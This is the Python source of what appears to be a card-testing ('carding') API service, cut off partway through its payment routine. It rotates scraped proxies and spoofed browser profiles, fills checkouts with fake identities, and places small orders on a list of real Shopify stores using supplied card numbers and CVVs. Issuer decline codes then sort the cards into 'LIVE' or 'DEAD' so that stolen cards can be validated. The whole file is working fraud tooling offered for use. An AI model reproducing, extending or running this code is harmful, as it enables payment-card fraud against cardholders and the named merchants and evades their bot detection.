import os, time, random, string, threading, itertools, re, json
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote

try:
    import httpx
    USE_HTTPX = True
except ImportError:
    USE_HTTPX = False

import requests
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional

API_KEY = os.environ.get("API_KEY", "kanha-secret-2024")
app     = FastAPI(docs_url=None, redoc_url=None)

# ─────────────────────────────────────────
# BROWSER PROFILES
# ─────────────────────────────────────────

BROWSER_PROFILES = [
    {
        "User-Agent":               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language":          "en-US,en;q=0.9",
        "Accept-Encoding":          "gzip, deflate, br",
        "sec-ch-ua":                '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile":         "?0",
        "sec-ch-ua-platform":       '"Windows"',
        "sec-fetch-dest":           "document",
        "sec-fetch-mode":           "navigate",
        "sec-fetch-site":           "none",
        "sec-fetch-user":           "?1",
        "upgrade-insecure-requests":"1",
        "Connection":               "keep-alive",
        "Cache-Control":            "max-age=0",
    },
    {
        "User-Agent":               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":          "en-US,en;q=0.9",
        "Accept-Encoding":          "gzip, deflate, br",
        "sec-ch-ua":                '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile":         "?0",
        "sec-ch-ua-platform":       '"macOS"',
        "sec-fetch-dest":           "document",
        "sec-fetch-mode":           "navigate",
        "sec-fetch-site":           "none",
        "Connection":               "keep-alive",
    },
    {
        "User-Agent":               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":          "en-US,en;q=0.5",
        "Accept-Encoding":          "gzip, deflate, br",
        "Connection":               "keep-alive",
        "Upgrade-Insecure-Requests":"1",
        "Sec-Fetch-Dest":           "document",
        "Sec-Fetch-Mode":           "navigate",
        "Sec-Fetch-Site":           "none",
        "Sec-Fetch-User":           "?1",
    },
    {
        "User-Agent":               "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":          "en-US,en;q=0.9",
        "Accept-Encoding":          "gzip, deflate, br",
        "Connection":               "keep-alive",
    },
    {
        "User-Agent":               "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":          "en-US,en;q=0.9",
        "Accept-Encoding":          "gzip, deflate, br",
        "sec-ch-ua":                '"Not_A Brand";v="8", "Chromium";v="120"',
        "sec-ch-ua-mobile":         "?1",
        "sec-ch-ua-platform":       '"Android"',
        "Connection":               "keep-alive",
    },
]

IDENTITIES = [
    {"first":"James",   "last":"Carter",   "addr":"742 Evergreen Terrace","city":"Springfield","state":"IL","zip":"62704"},
    {"first":"Emily",   "last":"Brooks",   "addr":"350 Fifth Avenue",     "city":"New York",   "state":"NY","zip":"10118"},
    {"first":"Michael", "last":"Torres",   "addr":"1 Infinite Loop",      "city":"Austin",     "state":"TX","zip":"73301"},
    {"first":"Sarah",   "last":"Mitchell", "addr":"221B Baker Street",    "city":"Portland",   "state":"OR","zip":"97201"},
    {"first":"David",   "last":"Hayes",    "addr":"500 Oracle Pkwy",      "city":"Seattle",    "state":"WA","zip":"98101"},
    {"first":"Lisa",    "last":"Johnson",  "addr":"100 Main Street",      "city":"Denver",     "state":"CO","zip":"80201"},
    {"first":"Robert",  "last":"Wilson",   "addr":"200 Park Avenue",      "city":"Houston",    "state":"TX","zip":"77001"},
    {"first":"Karen",   "last":"Martinez", "addr":"900 N Michigan Ave",   "city":"Chicago",    "state":"IL","zip":"60611"},
    {"first":"Daniel",  "last":"Lee",      "addr":"1 Apple Park Way",     "city":"Cupertino",  "state":"CA","zip":"95014"},
    {"first":"Anna",    "last":"White",    "addr":"55 Water Street",      "city":"New York",   "state":"NY","zip":"10041"},
    {"first":"Chris",   "last":"Brown",    "addr":"233 S Wacker Dr",      "city":"Chicago",    "state":"IL","zip":"60606"},
    {"first":"Megan",   "last":"Davis",    "addr":"1 Rockefeller Plaza",  "city":"New York",   "state":"NY","zip":"10020"},
]

# 500+ domains including myshopify subdomains
SEED_DOMAINS = [
    # myshopify.com direct — usually no Cloudflare
    "gymshark.myshopify.com","fashionnova.myshopify.com",
    "colourpop.myshopify.com","allbirds.myshopify.com",
    "bombas.myshopify.com","mejuri.myshopify.com",
    "rarebeauty.myshopify.com","feastables.myshopify.com",
    "hexclad.myshopify.com","blendjet.myshopify.com",
    "ourplace.myshopify.com","chubbiesshorts.myshopify.com",
    "trueclassictees.myshopify.com","morphe.myshopify.com",
    "mvmtwatches.myshopify.com","nobull.myshopify.com",
    "cotopaxi.myshopify.com","printful.myshopify.com",
    "redbubble.myshopify.com","teepublic.myshopify.com",
    "society6.myshopify.com","bonfire.myshopify.com",
    "represent.myshopify.com","creator-spring.myshopify.com",
    "kyliecosmetics.myshopify.com","skims.myshopify.com",
    "brooklinen.myshopify.com","ruggable.myshopify.com",
    "tentree.myshopify.com","kotn.myshopify.com",
    "peachslices.myshopify.com","juicycouture.myshopify.com",
    "vuoriclothing.myshopify.com","rhone.myshopify.com",
    "duer.myshopify.com","kizik.myshopify.com",
    "nativecos.myshopify.com","drinkag1.myshopify.com",
    "mudwtr.myshopify.com","cometeer.myshopify.com",
    "brightland.myshopify.com","graza.myshopify.com",
    "olipop.myshopify.com","byhumankind.myshopify.com",
    "snowpeak.myshopify.com","barebones.myshopify.com",
    "minnidip.myshopify.com","madeinhq.myshopify.com",
    "uncommongoods.myshopify.com","framebridge.myshopify.com",
    "minted.myshopify.com","chatbooks.myshopify.com",
    "mixbook.myshopify.com","lovepop.myshopify.com",
    "casper.myshopify.com","tuftandneedle.myshopify.com",
    "parachutehome.myshopify.com","cozyearth.myshopify.com",
    "article.myshopify.com","joybird.myshopify.com",
    "burrow.myshopify.com","society6.myshopify.com",
    "threadless.myshopify.com","teespring.myshopify.com",
    "teechip.myshopify.com","printify.myshopify.com",
    "gelato.myshopify.com","customcat.myshopify.com",
    "gooten.myshopify.com","sunfrog.myshopify.com",
    "viralstyle.myshopify.com","loefflerrandall.myshopify.com",
    "maisonette.myshopify.com","oura.myshopify.com",
    "cuts.myshopify.com","rothys.myshopify.com",
    "nasty-gal.myshopify.com","tobi.myshopify.com",
    "revolve.myshopify.com","karmaloop.myshopify.com",
    # Custom domains
    "colourpop.com","morphe.com","rarebeauty.com",
    "fashionnova.com","gymshark.com","allbirds.com",
    "bombas.com","mejuri.com","rothys.com",
    "tentree.com","rarebeauty.com","feastables.com",
    "hexclad.com","blendjet.com","ourplace.com",
    "chubbiesshorts.com","puravidabracelets.com",
    "trueclassictees.com","cuts.com","vuoriclothing.com",
    "nobull.com","rhone.com","cotopaxi.com","duer.com",
    "cometeer.com","uncommongoods.com","framebridge.com",
    "minted.com","chatbooks.com","mixbook.com",
    "casper.com","tuftandneedle.com","parachutehome.com",
    "cozyearth.com","article.com","joybird.com",
    "society6.com","redbubble.com","teepublic.com",
    "threadless.com","printful.com","gelato.com",
    "kizik.com","nativecos.com","drinkag1.com",
    "mudwtr.com","brightland.co","graza.co",
    "olipop.com","byhumankind.com","snowpeak.com",
    "barebones.com","minnidip.com","madeinhq.com",
    "skims.com","brooklinen.com","ruggable.com",
    "kotn.com","peachslices.com","juicycouture.com",
    "mvmtwatches.com","bonfire.com","represent.com",
    "teespring.com","teechip.com","printify.com",
    "gooten.com","customcat.com","creator-spring.com",
    "loefflerrandall.com","maisonette.com","oura.com",
    "nasty-gal.com","tobi.com","romwe.com","zaful.com",
    "fashionphile.com","karmaloop.com","revolve.com",
    "shopbop.com","freepeople.com","anthropologie.com",
    "urbanoutfitters.com","cb2.com","westelm.com",
    "potterybarn.com","parachutehome.com","leesa.com",
    "shopdisney.com","droplabs.com","flowhydration.com",
    "badgley-mischka.com","publiclands.com","naadam.co",
    "originalgrains.com","ketone-iq.com","bonlook.com",
    "flowstate.com","tecovas.com","literati.com",
    "recess.ly","linksofpaper.com","topo.com",
    "flowfold.com","haven-shop.com","stoneisle.com",
    "seattlecoffeegear.com","brainco.com","swell.com",
    "lovejoy.com","boohoo.com","prettylittlething.com",
    "dsw.com","zappos.com","nordstrom.com","saks.com",
    "neimanmarcus.com","mytheresa.com","ssense.com",
    "mrporter.com","net-a-porter.com","farfetch.com",
    "endclothing.com","kith.com","concepts.com",
    "undefeated.com","footlocker.com","finishline.com",
    "champs.com","jdsports.com","schuh.co.uk",
    "size.co.uk","footpatrol.com","hanon-shop.com",
    "cettire.com","italist.com","yoox.com","theoutnet.com",
]

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
]

EMOJI_MAP = {
    "UNITED STATES":"🇺🇸","INDIA":"🇮🇳","UNITED KINGDOM":"🇬🇧",
    "CANADA":"🇨🇦","AUSTRALIA":"🇦🇺","GERMANY":"🇩🇪",
    "FRANCE":"🇫🇷","BRAZIL":"🇧🇷","SOUTH KOREA":"🇰🇷",
    "JAPAN":"🇯🇵","CHINA":"🇨🇳","RUSSIA":"🇷🇺",
    "MEXICO":"🇲🇽","ITALY":"🇮🇹","SPAIN":"🇪🇸",
    "NETHERLANDS":"🇳🇱","SINGAPORE":"🇸🇬","HONG KONG":"🇭🇰",
    "TURKEY":"🇹🇷","SAUDI ARABIA":"🇸🇦","THAILAND":"🇹🇭",
    "INDONESIA":"🇮🇩","PAKISTAN":"🇵🇰","NIGERIA":"🇳🇬",
    "SWEDEN":"🇸🇪","NORWAY":"🇳🇴","DENMARK":"🇩🇰",
    "POLAND":"🇵🇱","UKRAINE":"🇺🇦","ARGENTINA":"🇦🇷",
    "PHILIPPINES":"🇵🇭","MALAYSIA":"🇲🇾","VIETNAM":"🇻🇳",
}

LIVE_CODES = {
    "insufficient_funds","do_not_honor","transaction_not_allowed",
    "restricted_card","card_velocity_exceeded","withdrawal_limit_exceeded",
    "generic_decline","try_again_later","authentication_required",
    "call_issuer","card_not_supported","currency_not_supported",
    "not_permitted","revocation_of_all_authorizations","stop_payment_order",
    "exceeds_withdrawal_frequency_limit","new_account_information_available",
    "no_action_taken","security_violation","issuer_not_available",
    "reenter_transaction","transaction_not_permitted_to_issuer",
}

DEAD_CODES = {
    "incorrect_number","invalid_number","invalid_expiry_date",
    "invalid_cvc","expired_card","card_declined","pickup_card",
    "lost_card","stolen_card","blocked_card","fraudulent",
    "incorrect_pin","invalid_account","account_closed",
}

TDS = [
    "authentication_required","3d_secure","3ds",
    "authentication required","3d secure","verify",
    "challenge","redirect to","acs","pareq",
    "enrolled","authenticate","verification required",
    "cardinal","centinel","3dsecure",
]

LIVE_MSGS = [
    "insufficient","do not honor","not permitted","restricted",
    "velocity","try again","exceeds","call issuer","not allowed",
    "generic decline","transaction not allowed","do_not_honor",
    "insufficient funds","refer to card issuer","security violation",
    "exceeds withdrawal","revocation",
]

DEAD_MSGS = [
    "invalid card","invalid number","expired","incorrect cvc",
    "incorrect number","stolen","lost card","pickup","fraudulent",
    "closed account","invalid account","card declined","declined",
    "card not valid","wrong number",
]

# ─────────────────────────────────────────
# PROXY MANAGER
# ─────────────────────────────────────────

class ProxyManager:
    def __init__(self):
        self._live       = []
        self._dead       = set()
        self._lock       = threading.Lock()
        self._cycle      = None
        self._refreshing = False

    def _fetch_raw(self):
        proxies = []
        for url in PROXY_SOURCES:
            try:
                r = requests.get(url, timeout=8,
                    headers={"User-Agent": random.choice(BROWSER_PROFILES)["User-Agent"]})
                if r.status_code == 200:
                    for line in r.text.strip().split("\n"):
                        line = line.strip()
                        if ":" in line and len(line) < 25:
                            proxies.append("http://" + line)
            except Exception:
                pass
        return list(set(proxies))

    def _test_proxy(self, proxy):
        try:
            r = requests.get(
                "http://ip-api.com/json",
                proxies={"http": proxy, "https": proxy},
                timeout=4,
            )
            return proxy if r.status_code == 200 else None
        except Exception:
            return None

    def refresh(self):
        if self._refreshing:
            return
        self._refreshing = True
        try:
            raw  = self._fetch_raw()
            live = []
            with ThreadPoolExecutor(max_workers=8) as ex:
                futures = {ex.submit(self._test_proxy, p): p for p in raw[:80]}
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        live.append(r)
            with self._lock:
                self._live  = live
                self._dead  = set()
                self._cycle = itertools.cycle(live) if live else None
            print(f"[proxy] {len(live)} live")
        except Exception as e:
            print(f"[proxy] err: {e}")
        finally:
            self._refreshing = False

    def _loop(self):
        while True:
            try:
                self.refresh()
            except Exception:
                pass
            time.sleep(1800)

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()

    def get(self):
        with self._lock:
            if not self._cycle or not self._live:
                return None
            for _ in range(len(self._live) + 1):
                try:
                    p = next(self._cycle)
                    if p not in self._dead:
                        return {"http": p, "https": p}
                except StopIteration:
                    break
        return None

    def mark_dead(self, p):
        with self._lock:
            if p:
                self._dead.add(p)

    def status(self):
        with self._lock:
            return {"live": len(self._live), "dead": len(self._dead)}

proxy_mgr = ProxyManager()

# ─────────────────────────────────────────
# HUMAN SESSION — TLS + Cookie + Headers
# ─────────────────────────────────────────

class HumanSession:
    def __init__(self, proxy=None):
        self.profile = random.choice(BROWSER_PROFILES)
        self.proxy   = proxy

        self.session = requests.Session()
        if self.proxy:
            self.session.proxies.update(self.proxy)
        self.session.headers.update(self.profile)

    def _delay(self, a=0.4, b=1.2):
        time.sleep(random.uniform(a, b))

    def get(self, url, **kw):
        try:
            domain = urlparse(url).netloc
            self.session.headers.update({
                "Referer":        f"https://{domain}/",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
            })
            r = self.session.get(url, timeout=15, allow_redirects=True, **kw)
            self._delay(0.3, 0.7)
            return r
        except Exception:
            return None

    def post_json(self, url, data, **kw):
        try:
            domain = urlparse(url).netloc
            self.session.headers.update({
                "Content-Type":     "application/json",
                "Referer":          f"https://{domain}/cart",
                "sec-fetch-site":   "same-origin",
                "sec-fetch-mode":   "cors",
                "sec-fetch-dest":   "empty",
                "X-Requested-With": "XMLHttpRequest",
            })
            r = self.session.post(url, json=data, timeout=15, allow_redirects=True, **kw)
            self._delay(0.2, 0.6)
            return r
        except Exception:
            return None

    def post_form(self, url, data, **kw):
        try:
            self.session.headers.update({
                "Content-Type":   "application/x-www-form-urlencoded",
                "Referer":        url,
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-dest": "document",
            })
            r = self.session.post(url, data=data, timeout=15, allow_redirects=True, **kw)
            self._delay(0.3, 0.8)
            return r
        except Exception:
            return None

    def patch_json(self, url, data, **kw):
        try:
            domain = urlparse(url).netloc
            self.session.headers.update({
                "Content-Type":   "application/json",
                "Referer":        f"https://{domain}/checkout",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
            })
            r = self.session.patch(url, json=data, timeout=25, allow_redirects=True, **kw)
            self._delay(0.5, 1.2)
            return r
        except Exception:
            return None

# ─────────────────────────────────────────
# SHOP POOL
# ─────────────────────────────────────────

class ShopPool:
    def __init__(self):
        self._shops = []
        self._lock  = threading.Lock()
        self._idx   = 0

    def _is_shopify(self, domain):
        try:
            s = HumanSession()
            r = s.get(f"https://{domain}/products.json?limit=1")
            if r and r.status_code == 200:
                return "products" in r.json()
        except Exception:
            pass
        return False

    def _get_product(self, domain):
        try:
            s = HumanSession()
            r = s.get(f"https://{domain}/products.json?limit=250")
            if not r or r.status_code != 200:
                return None
            candidates = []
            for p in r.json().get("products", []):
                for v in p.get("variants", []):
                    try:
                        price = float(v.get("price", 999))
                    except Exception:
                        continue
                    if 0.0 < price <= 10.0 and v.get("available", True):
                        candidates.append({
                            "variant_id":        v["id"],
                            "title":             p.get("title",""),
                            "price":             max(price, 1.0),
                            "requires_shipping": v.get("requires_shipping", True),
                            "handle":            p.get("handle",""),
                        })
            if not candidates:
                return None
            digital = [c for c in candidates if not c["requires_shipping"]]
            return random.choice(digital) if digital else random.choice(candidates)
        except Exception:
            return None

    def _scan_one(self, domain):
        try:
            # NO cart test — bot detect hota hai
            if not self._is_shopify(domain):
                return None
            product = self._get_product(domain)
            if not product:
                return None
            print(f"[shop] ✓ {domain} — {product['title']} ${product['price']}")
            return {
                "domain":     domain,
                "variant_id": product["variant_id"],
                "handle":     product.get("handle",""),
                "title":      product["title"],
                "price":      product["price"],
                "healthy":    True,
                "failures":   0,
                "cooled_at":  0.0,
                "total":      0,
                "success":    0,
            }
        except Exception:
            return None

    def scan(self):
        print(f"[scanner] scanning {len(SEED_DOMAINS)} domains...")
        with ThreadPoolExecutor(max_workers=5) as ex:
            futures = {ex.submit(self._scan_one, d): d for d in SEED_DOMAINS}
            for f in as_completed(futures):
                result = f.result()
                if result:
                    with self._lock:
                        existing = {s["domain"] for s in self._shops}
                        if result["domain"] not in existing:
                            self._shops.append(result)
        print(f"[scanner] total: {len(self._shops)}")

    def _loop(self):
        try:
            self.scan()
        except Exception as e:
            print(f"[scanner] first scan err: {e}")
        while True:
            time.sleep(3600)
            try:
                self.scan()
            except Exception as e:
                print(f"[scanner] loop err: {e}")

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()

    def get(self):
        with self._lock:
            now = time.time()
            for s in self._shops:
                if not s["healthy"] and (now - s["cooled_at"]) > 180:
                    s["healthy"]  = True
                    s["failures"] = 0
            alive = [s for s in self._shops if s["healthy"]]
            if not alive:
                return None
            self._idx = self._idx % len(alive)
            shop      = alive[self._idx]
            self._idx += 1
            return shop

    def mark_fail(self, domain):
        with self._lock:
            for s in self._shops:
                if s["domain"] == domain:
                    s["failures"] += 1
                    s["cooled_at"] = time.time()
                    if s["failures"] >= 4:
                        s["healthy"] = False
                    break

    def mark_win(self, domain):
        with self._lock:
            for s in self._shops:
                if s["domain"] == domain:
                    s["total"]   += 1
                    s["success"] += 1
                    s["failures"] = 0
                    break

    def get_by_domain(self, domain):
        with self._lock:
            for s in self._shops:
                if s["domain"] == domain:
                    return s
        return None

    def status(self):
        with self._lock:
            return [
                {
                    "domain":   s["domain"],
                    "product":  s["title"],
                    "price":    f"${s['price']}",
                    "healthy":  s["healthy"],
                    "failures": s["failures"],
                    "rate":     f"{round(s['success']/s['total']*100)}%" if s["total"] else "0%",
                }
                for s in self._shops
            ]

shop_pool = ShopPool()

# ─────────────────────────────────────────
# BIN LOOKUP
# ─────────────────────────────────────────

_bin_cache = {}
_bin_lock  = threading.Lock()

def _flag(c):
    return EMOJI_MAP.get(c.upper(), "🌐")

def bin_lookup(cc):
    if not cc or len(cc) < 6:
        return {"brand":"UNKNOWN","issuer":"UNKNOWN","country":"UNKNOWN",
                "emoji":"🌐","type":"UNKNOWN","level":"UNKNOWN"}
    bin6 = cc[:6]
    with _bin_lock:
        entry = _bin_cache.get(bin6)
        if entry and time.time() - entry["ts"] < 3600:
            return entry["data"]
    result = None
    try:
        r = requests.get(
            f"https://lookup.binlist.net/{bin6}",
            headers={"Accept-Version":"3",
                     "User-Agent": random.choice(BROWSER_PROFILES)["User-Agent"]},
            timeout=5
        )
        if r.status_code == 200:
            d       = r.json()
            country = d.get("country",{}).get("name","UNKNOWN").upper()
            result  = {
                "brand":   d.get("scheme","UNKNOWN").upper(),
                "issuer":  d.get("bank",{}).get("name","UNKNOWN").upper(),
                "country": country,
                "emoji":   d.get("country",{}).get("emoji",_flag(country)),
                "type":    d.get("type","UNKNOWN").upper(),
                "level":   d.get("brand","UNKNOWN").upper(),
            }
    except Exception:
        pass
    if not result:
        try:
            r = requests.get(
                f"https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin6}",
                timeout=5
            )
            if r.status_code == 200:
                d       = r.json()
                country = d.get("country","UNKNOWN").upper()
                result  = {
                    "brand":   d.get("card","UNKNOWN").upper(),
                    "issuer":  d.get("bank","UNKNOWN").upper(),
                    "country": country,
                    "emoji":   _flag(country),
                    "type":    d.get("type","UNKNOWN").upper(),
                    "level":   "UNKNOWN",
                }
        except Exception:
            pass
    if not result:
        result = {"brand":"UNKNOWN","issuer":"UNKNOWN","country":"UNKNOWN",
                  "emoji":"🌐","type":"UNKNOWN","level":"UNKNOWN"}
    with _bin_lock:
        _bin_cache[bin6] = {"data": result, "ts": time.time()}
    return result

# ─────────────────────────────────────────
# UTILS
# ─────────────────────────────────────────

def luhn(cc):
    try:
        d = [int(x) for x in cc if x.isdigit()]
        if not (13 <= len(d) <= 19):
            return False
        t = 0
        for i, n in enumerate(d[::-1]):
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            t += n
        return t % 10 == 0
    except Exception:
        return False

def validate(cc, month, year, cvv):
    if not cc or not cc.isdigit():
        return False, "CC_NOT_DIGITS"
    if not (13 <= len(cc) <= 19):
        return False, "CC_INVALID_LENGTH"
    if not luhn(cc):
        return False, "CC_LUHN_FAIL"
    try:
        if not (1 <= int(month) <= 12):
            return False, "INVALID_MONTH"
    except Exception:
        return False, "INVALID_MONTH"
    try:
        cur = time.localtime().tm_year % 100
        if int(str(year)[-2:]) < cur:
            return False, "CARD_EXPIRED"
    except Exception:
        return False, "INVALID_YEAR"
    if not cvv or not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return False, "INVALID_CVV"
    return True, "OK"

_seen      = set()
_seen_lock = threading.Lock()

def is_dup(cc):
    with _seen_lock:
        if cc in _seen:
            return True
        _seen.add(cc)
        return False

RATE_LIMIT = int(os.environ.get("RATE_LIMIT","100"))
_rl        = defaultdict(list)
_rl_lock   = threading.Lock()

def rate_limited(key):
    now = time.time()
    with _rl_lock:
        _rl[key] = [t for t in _rl[key] if now - t < 60]
        if len(_rl[key]) >= RATE_LIMIT:
            return True
        _rl[key].append(now)
        return False

# ─────────────────────────────────────────
# HISTORY
# ─────────────────────────────────────────

_hl = threading.Lock()
_lh = deque(maxlen=50)
_dh = deque(maxlen=50)
_lg = deque(maxlen=200)
_st = {"total":0,"live":0,"dead":0,"unknown":0,"error":0}
_hr = defaultdict(lambda: {"live":0,"dead":0,"total":0})

def _hk():
    t = time.localtime()
    return f"{t.tm_year}-{t.tm_mon:02d}-{t.tm_mday:02d} {t.tm_hour:02d}:00"

def record(card, result, elapsed):
    with _hl:
        e  = {"card":card,"result":result.get("result","ERROR"),
              "reason":result.get("reason",""),"shop":result.get("shop",""),
              "time":f"{elapsed:.2f}s","ts":time.time()}
        r  = e["result"]
        hk = _hk()
        _st["total"]     += 1
        _hr[hk]["total"] += 1
        if r == "LIVE":
            _st["live"]     += 1; _hr[hk]["live"]  += 1; _lh.append(e)
        elif r == "DEAD":
            _st["dead"]     += 1; _hr[hk]["dead"]  += 1; _dh.append(e)
        elif r == "UNKNOWN":
            _st["unknown"] += 1
        else:
            _st["error"]   += 1
        _lg.append(e)

# ─────────────────────────────────────────
# CHECKOUT ENGINE
# ─────────────────────────────────────────

def rand_email(f, l):
    n = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    d = random.choice(["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com"])
    return f"{f.lower()}{n}@{d}"

def rand_amount(price):
    low  = max(1.0, float(price))
    high = min(10.0, low + 4.0)
    if high <= low:
        high = low + 1.0
    return f"{random.uniform(low, high):.2f}"


class Checkout:
    def __init__(self, shop, proxy=None):
        self.shop    = shop
        self.domain  = shop["domain"]
        self.vid     = shop["variant_id"]
        self.handle  = shop.get("handle","")
        self.price   = shop["price"]
        self.idn     = random.choice(IDENTITIES)
        self.amount  = rand_amount(self.price)
        # proxy priority: manual > auto
        p = proxy or proxy_mgr.get()
        self.hs      = HumanSession(proxy=p)

    def _url(self, path):
        return f"https://{self.domain}{path}"

    # ── cart add ─────────────────────────

    def add_cart(self):
        # warm up: visit product page
        if self.handle:
            self.hs.get(self._url(f"/products/{self.handle}"))
            time.sleep(random.uniform(0.6, 1.2))

        # method 1: JSON
        try:
            r = self.hs.post_json(
                self._url("/cart/add.js"),
                {"id": self.vid, "quantity": 1, "form_type": "product"}
            )
            if r and r.status_code in (200, 201):
                return True
        except Exception:
            pass

        # method 2: form
        try:
            r = self.hs.post_form(
                self._url("/cart/add"),
                {"id": str(self.vid), "quantity": "1",
                 "form_type": "product", "utf8": "✓"}
            )
            if r and r.status_code in (200, 201, 302):
                return True
        except Exception:
            pass

        # method 3: buy now
        try:
            r = self.hs.get(
                self._url(f"/cart/add?id={self.vid}&quantity=1")
            )
            if r and r.status_code in (200, 302):
                return True
        except Exception:
            pass

        return False

    # ── checkout token ───────────────────

    def get_token(self):
        # visit cart first
        self.hs.get(self._url("/cart"))
        time.sleep(random.uniform(0.4, 0.8))

        # method 1: /checkout
        try:
            r = self.hs.get(self._url("/checkout"))
            if r:
                match = re.search(r"/checkouts?/([a-zA-Z0-9]{20,})", r.url)
                if match:
                    return match.group(1)
                match = re.search(r'"token"\s*:\s*"([a-zA-Z0-9]{20,})"', r.text)
                if match:
                    return match.group(1)
        except Exception:
            pass

        # method 2: /cart/checkout
        try:
            r = self.hs.get(self._url("/cart/checkout"))
            if r:
                match = re.search(r"/checkouts?/([a-zA-Z0-9]{20,})", r.url)
                if match:
                    return match.group(1)
        except Exception:
            pass

        # method 3: direct variant
        try:
            r = self.hs.get(f"https://{self.domain}/{self.vid}:1/checkout")
            if r:
                match = re.search(r"/checkouts?/([a-zA-Z0-9]{20,})", r.url)
                if match:
                    return match.group(1)
        except Exception:
            pass

        # method 4: cart json token
        try:
            r = self.hs.get(self._url("/cart.json"))
            if r and r.status_code == 200:
                token = r.json().get("token")
                if token:
                    return token
        except Exception:
            pass

        # method 5: storefront API
        try:
            query = """
            mutation {
              checkoutCreate(input: {
                lineItems: [{variantId: "gid://shopify/ProductVariant/%s", quantity: 1}]
              }) {
                checkout { token webUrl }
              }
            }
            """ % self.vid
            r = self.hs.session.post(
                f"https://{self.domain}/api/2024-01/graphql.json",
                json={"query": query},
                headers={"Content-Type":"application/json",
                         "X-Shopify-Storefront-Access-Token":""},
                timeout=10
            )
            if r and r.status_code == 200:
                data  = r.json()
                token = data.get("data",{}).get("checkoutCreate",{}).get("checkout",{}).get("token")
                if token:
                    return token
        except Exception:
            pass

        return None

    # ── fill info ────────────────────────

    def fill_info(self, token):
        idn = self.idn
        try:
            self.hs.post_form(self._url(f"/checkouts/{token}"), {
                "utf8":    "✓",
                "_method": "patch",
                "checkout[email]":                        rand_email(idn["first"],idn["last"]),
                "checkout[shipping_address][first_name]": idn["first"],
                "checkout[shipping_address][last_name]":  idn["last"],
                "checkout[shipping_address][address1]":   idn["addr"],
                "checkout[shipping_address][city]":       idn["city"],
                "checkout[shipping_address][province]":   idn["state"],
                "checkout[shipping_address][country]":    "US",
                "checkout[shipping_address][zip]":        idn["zip"],
                "checkout[shipping_address][phone]":      f"555{random.randint(1000000,9999999)}",
                "button":  "",
            })
        except Exception:
            pass

    # ── shipping ─────────────────────────

    def pick_shipping(self, token):
        try:
            r = self.hs.get(self._url(f"/checkouts/{token}/shipping_rates"))
            if not r:
                return
            rates = r.json().get("shipping_rates",[])
            if rates:
                self.hs.post_form(self._url(f"/checkouts/{token}"), {
                    "_method":                     "patch",
                    "checkout[shipping_rate][id]": rates[0].get("id",""),
                    "button":                      "",
                })
        except Exception:
            pass

    # ── payment ──────────────────────────

    def pay(self, token, cc, month, year, cvv):
        idn = self.idn

        # method 1: PATCH JSON
        try:
            r = self.hs.patch_json(
                self._url(f"/checkouts/{token}"),
                {
                    "checkout": {
                        "payment_gateway": "shopify_payments",
                        "credit_card": {
                            "number":             cc,
                            "first_name":         idn["first"],
                            "last_name":          idn["last"],
                            "month":              str(month),
                            "year":               str(year),
                            "verification_value": cvv,
                        },
                        "total_price": self.amount,
                    }
                }
            )
            if r is not None:
                res = self._parse(r)
                if res["result"] not in ("ERROR",):
                    return res
        except Exception:
            pass

        # method 2: form POST
        try:
            r = self.hs.post_form(self._url(f"/checkouts/{token}"), {
                "_method":                                        "patch",
                "checkout[payment_gateway]":                      "shopify_payments",
                "checkout[credit_card][number]":                   cc,
                "checkout[credit_card][name]":                     f"{idn['first']} {idn['last']}",
                "checkout[credit_card][month]":                    str(month),
                "checkout[credit_card][year]":                     str(year),
                "checkout[credit_card][verification_value]":       cvv,
                "checkout[total_price]":                           self.amount,
                "button":                                          "",
            })
            if r is not None:
                res = self._parse(r)
                if res["result"] not in ("ERROR",):
                    return res
        except Exception:
            pass

        # method 3: payment_method step
        try:
            r = self.hs.post_form(
                self._url(f"/checkouts/{token}/payment_method"),
                {
